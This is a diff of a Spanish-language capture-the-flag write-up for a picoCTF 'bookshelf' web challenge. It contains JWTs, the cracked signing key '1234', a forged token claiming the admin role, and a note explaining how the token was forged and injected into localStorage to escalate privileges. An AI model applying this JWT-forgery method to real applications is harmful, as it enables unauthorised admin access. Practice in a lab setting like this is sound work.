@@ -16,22 +16,16 @@ Website can be accessed [here!](http://saturn.picoctf.net:53879/).
 
 **Solución 1
 ```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc3OTUxNjU0NCwiaWF0IjoxNzc4OTExNzQ0LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.CS4j1RpHKdbu95NbuNG4aVpEJW6sc0oTmqad6YnPWVg
-
-¡Token falsificado con éxito!
-
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3Nzk1MTY1NDQsImlhdCI6MTc3ODkxMTc0NCwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.eD-nERuRzf3lvRBAiOHnMlGcOtnrS9rEByIEBV8lghs
-
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3Nzk1MTY1NDQsImlhdCI6MTc3ODkxMTc0NCwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.eD-nERuRzf3lvRBAiOHnMlGcOtnrS9rEByIEBV8lghs
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc3OTU4MTE4NSwiaWF0IjoxNzc4OTc2Mzg1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.92s3tHrcRu0wgX8I1tg3GIP4m42YPukXAx73qAO4Q8E
 
 El SECRET_KEY es:1234
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3Nzk1ODExODUsImlhdCI6MTc3ODk3NjM4NSwidXNlcklkIjoxLCJlbWFpbCI6InVzZXIifQ.1P0GgiCfWKYzEd6_iBBnPffoW9t-kMk0omE7_6Glh8s
 
 
 
 ```
 
 #### NOTAS
-1.Actualiza los repositorios:** `sudo apt update`
-2.Instala pip (el gestor de paquetes de Python):** `sudo apt install python3-pip`
-3.Ahora sí, instala flask-unsign:** `pip install flask-unsign`
+Escalación de privilegios mediante manipulación de JWT explotando una clave secreta estática (`1234`) por una mala implementación de aleatoriedad en el backend (`SecretGenerator.java`). **Solución:** Se forjó un token modificando los _claims_ a `role: admin` e `userId: 1`, firmándolo con la clave expuesta e inyectándolo en el `localStorage` vía consola para evadir validaciones del frontend.
 
